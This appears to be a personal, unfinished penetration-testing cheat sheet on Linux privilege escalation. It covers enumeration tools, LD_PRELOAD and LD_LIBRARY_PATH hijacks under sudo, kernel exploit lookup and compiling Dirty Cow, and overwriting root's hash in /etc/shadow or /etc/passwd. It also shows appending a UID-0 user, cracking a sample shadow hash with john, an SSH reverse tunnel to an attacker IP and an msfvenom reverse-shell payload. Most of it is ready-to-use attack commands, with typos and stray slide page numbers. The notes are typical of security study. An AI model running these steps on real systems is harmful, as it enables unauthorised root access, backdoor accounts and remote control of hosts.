# Work in Progress

## automated scripts

linux smart enumeration: https://github.com/diego-treitos/linux-smart-enumeration
```
# print everything the script can gather and do not prompt for a password
./lse.sh -l 2 -i
```

Linenum - https://github.com/rebootuser/LinEnum
```
# export files to a directory and do thorough tests
./linenum.sh -t -e linenum
```

linpeas
linux exploit suggester

linux priv checker - https://github.com/linted/linuxprivchecker

beroot - https://github.com/AlessandroZ/BeRoot

unix -priv-checker - http://pentestmonkey.net/tools/audit/unix-privesc-check

## Survey

Kernel Version
```
uname -a

```

list programs you can run as 
```
sudo -l
sudo -s 
sudo -i
```
#### Networking 

Port Forwarding to your attacker station:
```
ssh -R <ATTACKER_PORT>:127.0.0.1:<SERVICE_PORT> <USERNAME>@<ATTACKER_IP>
```
### Cronjobs

List cron table files (cron tabs)
```
# user
/var/spool/cron
/var/spool/cron/crontabs/

# system-wide cron jobs 
/etc/crontab 
```
## Techniques 

## path injectoin
if can write to a location in PATH variable

### shell escape sequences 

escaping a progrma n to spwan a shell if the program is run a root 

list of programs with shell escape sequences: https://gtfobins.github.io/

### Enviorment Variables 

LD_PRELOAD is an environment variable which can be set to
the path of a shared object (.so) file.
When set, the shared object will be loaded before any others.
By creating a custom shared object and creating an init()
function, we can execute code as soon as the object is loaded.
86

Compile preload.c to preload.so:
4. Run any allowed program using sudo, while setting the
LD_PRELOAD environment variable to the full path of the
preload.so file:
90
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
$ sudo LD_PRELOAD=/tmp/preload.so apache2

The LD_LIBRARY_PATH environment variable contains a set of directories where
shared libraries are searched for first.
The ldd command can be used to print the shared libraries used by a program:
By creating a shared library with the same name as one used by a program, and
setting LD_LIBRARY_PATH to its parent directory, the program will load our
shared library instead.

Compile library_path.c into libcrypt.so.1:
4. Run apache2 using sudo, while setting the
LD_LIBRARY_PATH environment variable to the current
path (where we compiled library_path.c):
94
$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
$ sudo LD_LIBRARY_PATH=. apache2

### Kernel Exploits 


Kernel Version
```
uname -a

```
Use the kernel version to find exploits
```
searchsploit linux kernel <VERSION_NUMBER> priv esc
```

Best to use linux-exploit-suggester-2 to get a more refined list:
```
perl linux-exploit-suggester-2.pl -k <VERSION_NUMBER>
```

#### Common exploit 

Dirty Cow complie:
```
gcc -pthread cow.c -o cow
```

### Service Exploits 

Services are programs that run in the background.  Exploiting a service running as root provides command execution as root 

show all processes running as root
```
ps aux | grep "^root"
```
 Obtain the version of the identified programs:
 ```
 <PROGRAM> --version
 <PROGRAM> -v
 
 # debian
 dpkg -l | grep <PROGRAM>
 
 # rpm systems
 rpm -ga | grep <PROGRAM>
 ```

Use searchsploit to find exploits for these programs.

### Shared Object Injection 

When a prgram is execited, it will try to load the shared objects it requires,  using `strace` we can track the system callls and determine whether any share objects were not found.  If we can write to the location the program tries to open, we can create a shared object to spawn a root shell.

### weak file permissions 

World Readable - means it can read by anyone 
world writeable - anyone can write to the file 

if etc/shadow is readable we can add a user to it

make the massword with the correct hash:
```
mkpasswd -m sha-512 <PASSWORD>
```
now replace the root users password hash with the one that you made.  now you can su to root!

if etc/passwd is readable we can add a user to it

The /etc/passwd historically contained user password hashes.
For backwards compatibility, if the second field of a user row in /etc/passwd
contains a password hash, it takes precedent over the hash in /etc/shadow.
If we can write to /etc/passwd, we can easily enter a known password hash for
the root user, and then use the su command to switch to the root user.

generate a password hash to be placed in the etc/passwd:
```
openssl passwd "password"
```
now add the password hash to the second filed in the etc/passwd file in place if the X for the root user


Alternatively, if we can only append to the file, we can create a new user but
assign them the root user ID (0). This works because Linux allows multiple entries
for the same user ID, as long as the usernames are different.

```
echo "<USERNAME>:L9yLGxncbOROc:0:0:root:/root:/bin/bash" >> /etc/passwd
```


the x in the secod row means to look in the /etc/shadow file
- can delete the x which linux may interpret as there being no password


### Cracking passwords 

if the /etc/shadow file is readable 


root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
- password hash has his between the first and second colon (only copy that to a txt file for cracking)
- $6$ = SHA512
- 

Crack the hash using john
```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```


### SUIG/SGID

SUID files get executed with the privileges of the file owner.
SGID files get executed with the privileges of the file group.
If the file is owned by root, it gets executed with root
privileges,

Locate all files with SUID or SGID:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
can use shell esacpe on files suid/sgid set 



## Reverse Shells 
```
msfvenom -p linux/x86/reverse_shell_tcp lhost= lport= -f elf -o rev_shell.elf
```

Native reverse shells:

reverse shell generator: https://github.com/mthbernardes/rsg 



